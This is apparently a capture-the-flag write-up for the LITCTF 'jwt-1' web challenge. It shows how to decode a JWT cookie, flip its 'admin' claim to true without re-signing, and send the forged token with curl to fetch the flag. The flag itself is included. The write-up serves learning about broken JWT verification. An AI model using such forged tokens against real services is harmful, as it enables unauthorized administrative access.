---
title: jwt-1
date: 2023-12-10T13:37:49+02:00
author: zacian
tags:
  - Web
draft: false
---

## Description

I just made a website. Since cookies seem to be a thing of the old days, I updated my authentication! With these modern web technologies, I will never have to deal with sessions again. Come try it out at http://litctf.org:31781/.

## Solution

On visiting the site, we can see a button named `Get Flag` 

On clicking it it takes to to `http://litctf.org:31781/flag` there it says `Unauthorized`

The main page also has a login link under which it says `You can't do much without logging in...`

On visiting the login link we also get to see a signup feature but we to solve the challenge we don't need to signup, in sing in or login page just put any data

Now if we visit the `Storage` Section in the developers tools and select the `Cookies` we get to see an entry. Now if we copy the cookie value which is a json web token, we can decode it form [jwt.io](https://jwt.io/)

Now for JWT , the header section shows the following

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The Payload section contains the following

```json
{
  "name": "user",
  "admin": false
}
```

All we have to do is change the admin value from false to true

```json
{
  "name": "user",
  "admin": true
}
```

copy the JWT token 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidXNlciIsImFkbWluIjp0cnVlfQ.okvzRibW56T_1HP_c_MbS8k6Vbww7G3c6lQ7IhgGZTc
```

Now we can copy the value and replace the token and get the flag from `/flag` or just click the button

```
Flag : LITCTF{o0ps_forg0r_To_v3rify_1re4DV9}
```

We can also do curl to get the flag 

----

```bash
curl -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidXNlciIsImFkbWluIjp0cnVlfQ.okvzRibW56T_1HP_c_MbS8k6Vbww7G3c6lQ7IhgGZTc' http://litctf.org:31781/flag/
```

Soure of knowledge for using curl : https://catonmat.net/cookbooks/curl/set-cookies